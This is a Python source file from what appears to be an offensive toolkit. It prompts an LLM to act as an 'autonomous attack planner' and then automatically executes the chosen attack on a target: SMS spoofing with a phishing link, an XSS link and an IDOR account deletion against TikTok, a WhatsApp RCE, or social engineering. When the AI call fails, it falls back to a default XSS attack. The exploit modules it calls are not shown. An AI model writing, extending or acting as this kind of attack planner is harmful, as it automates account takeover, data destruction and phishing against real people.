import json
import re
import groq
from config import GROQ_API_KEY
from modules.utils import logger

class AIAnalyzer:
    def __init__(self, orchestrator):
        self.orchestrator = orchestrator
        self.groq_client = groq.Client(api_key=GROQ_API_KEY) if GROQ_API_KEY else None

    def _call_llm(self, prompt, max_tokens=400, temperature=0.2):
        if not self.groq_client:
            raise RuntimeError("Groq API key not configured.")
        # Use mixtral – always available and reliable
        try:
            response = self.groq_client.chat.completions.create(
                model="mixtral-8x7b-32768",
                messages=[{"role": "user", "content": prompt}],
                temperature=temperature,
                max_tokens=max_tokens
            )
            return response.choices[0].message.content
        except Exception as e:
            logger.error(f"Groq API error: {e}")
            raise RuntimeError(f"Groq failed: {e}")

    def analyze_and_act(self, target_id, target_data):
        prompt = f"""
You are an autonomous attack planner. You MUST output a single JSON object with:
- "best_attack": one of ["sms_spoof", "xss_link", "idor_delete", "wa_rce", "social_engineering"]
- "reasoning": short explanation
- "parameters": dict (e.g., {{"phone": "+1234567890", "email": "target@example.com", "username": "victim", "account_id": "123"}})

Target data: {json.dumps(target_data)}
Output ONLY JSON. No extra text.
"""
        try:
            raw = self._call_llm(prompt, max_tokens=300, temperature=0.3)
            # Try to parse JSON; if fails, extract JSON from raw
            try:
                result = json.loads(raw)
            except json.JSONDecodeError:
                # Look for JSON-like structure
                match = re.search(r'\{.*\}', raw, re.DOTALL)
                if match:
                    result = json.loads(match.group(0))
                else:
                    raise ValueError("No JSON found in AI response")
        except Exception as e:
            logger.error(f"AI processing failed: {e}")
            return {
                "error": f"AI unavailable: {str(e)}",
                "best_attack": "xss_link",
                "reasoning": "AI failed, using default attack",
                "parameters": {"username": target_data.get("identifier", ""), "email": "fallback@example.com"}
            }

        attack = result.get("best_attack")
        params = result.get("parameters", {})
        exec_result = self._execute_attack(target_id, attack, params)
        result['execution_result'] = exec_result
        self.orchestrator.log_attack(target_id, attack, exec_result)
        return result

    def _execute_attack(self, target_id, attack_type, params):
        if attack_type == 'sms_spoof':
            return self.orchestrator.tiktok_sms.exploit(params.get('phone'), 'http://phishing.link')
        elif attack_type == 'xss_link':
            return self.orchestrator.tiktok_xss.exploit(params.get('username'), params.get('email'))
        elif attack_type == 'idor_delete':
            return self.orchestrator.tiktok_idor.exploit(params.get('account_id'))
        elif attack_type == 'wa_rce':
            return self.orchestrator.wa_rce.exploit(params.get('phone'))
        elif attack_type == 'social_engineering':
            return self.orchestrator.social_engineer(params)
        else:
            return {'success': False, 'output': f'Unknown attack type: {attack_type}'}
